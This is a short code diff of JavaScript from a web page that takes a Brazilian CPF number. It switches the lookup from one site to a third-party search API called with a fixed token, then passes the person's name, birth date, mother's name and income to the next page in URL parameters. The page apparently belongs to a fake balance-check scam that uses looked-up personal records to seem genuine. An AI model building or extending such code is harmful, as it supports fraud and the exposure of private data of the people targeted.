@@ -213,17 +213,18 @@ function consultar(){
   btn.textContent='CONSULTANDO...';
   btn.disabled=true;
   
-  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
+  fetch('https://searchapi.dnnl.live/consulta?token_api=2077&cpf='+cpf)
     .then(function(r){return r.json();})
     .then(function(d){
       document.getElementById('loading-overlay').classList.add('show');
       setTimeout(function(){
         var url='../3/index.html?cpf='+cpf;
-        if(d && !d.erro) {
-          if(d.nome) url+='&nome='+encodeURIComponent(d.nome);
-          if(d.nascimento) url+='&nasc='+encodeURIComponent(d.nascimento);
-          if(d.nome_mae) url+='&mae='+encodeURIComponent(d.nome_mae);
-          if(d.valor) url+='&valor='+encodeURIComponent(d.valor);
+        if(d && d.status === 200 && d.dados && d.dados[0]) {
+          var item = d.dados[0];
+          if(item.NOME) url+='&nome='+encodeURIComponent(item.NOME);
+          if(item.NASC) url+='&nasc='+encodeURIComponent(item.NASC);
+          if(item.NOME_MAE) url+='&mae='+encodeURIComponent(item.NOME_MAE);
+          if(item.RENDA) url+='&valor='+encodeURIComponent(item.RENDA);
         }
         // Verificar se deve pular o termo
         var skipTermo = new URLSearchParams(window.location.search).get('skip-termo') === '1';
